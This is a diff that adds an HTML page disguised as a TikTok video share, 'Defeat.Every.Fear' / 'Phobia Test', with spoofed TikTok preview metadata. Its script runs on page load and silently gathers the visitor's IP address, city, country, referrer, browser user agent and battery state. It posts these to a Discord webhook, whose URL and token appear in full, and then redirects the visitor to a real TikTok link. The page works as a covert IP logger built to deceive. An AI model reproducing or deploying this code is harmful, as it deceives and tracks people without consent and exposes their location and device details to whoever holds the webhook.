@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok • Defeat.Every.Fear</title>
+    <meta name="author" content="TikTok">
+    <meta name="description" content="114.8K likes, 8029 comments. “Phobia Test: Amusement Park Rides🎢😱”">
+    <meta property="og:title" content="TikTok • Defeat.Every.Fear">
+    <meta property="og:description" content="114.8K likes, 8029 comments. “Phobia Test: Amusement Park Rides🎢😱”">
+    <meta property="og:image" content="https://media.discordapp.net/attachments/1028386085786632295/1270787388930658375/IMG_4991.png?ex=66b4f87b&is=66b3a6fb&hm=03e5871a1295cb147f226bf345fa91fa473b5e06a74504c4de18d8948f724f23&">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://media.discordapp.net/attachments/1028386085786632295/1270787388930658375/IMG_4991.png?ex=66b4f87b&is=66b3a6fb&hm=03e5871a1295cb147f226bf345fa91fa473b5e06a74504c4de18d8948f724f23&">
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+    <script>
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+            return null;
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        async function sendWebhook() {
+            const batteryInfo = await getBatteryInfo();
+            const ipInfo = await getIPInfo();
+
+            const textContent = `
+                IP Address: ${ipInfo?.ip || 'N/A'}
+                Referrer: ${document.referrer || 'N/A'}
+                Device: ${navigator.userAgent || 'N/A'}
+                Battery Level: ${batteryInfo ? (batteryInfo.level * 100) + '%' : 'N/A'}
+                Charging: ${batteryInfo ? batteryInfo.charging : 'N/A'}
+                Country: ${ipInfo?.country_name || 'N/A'}
+                City: ${ipInfo?.city || 'N/A'}
+            `;
+
+            await fetch('https://discord.com/api/webhooks/1270784182783836313/qo8sXsOWGrQB8qxkAfIL7g2HjRsJQ5DG-4qxu5_ZkcRZeghvQCihz0mgj_Y8WnDIyaYW', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: textContent })
+            });
+
+            window.location.href = "https://vm.tiktok.com/ZGevDfeRg/";
+        }
+
+        window.onload = sendWebhook;
+    </script>
+</head>
+<body>
+</body>
+</html>
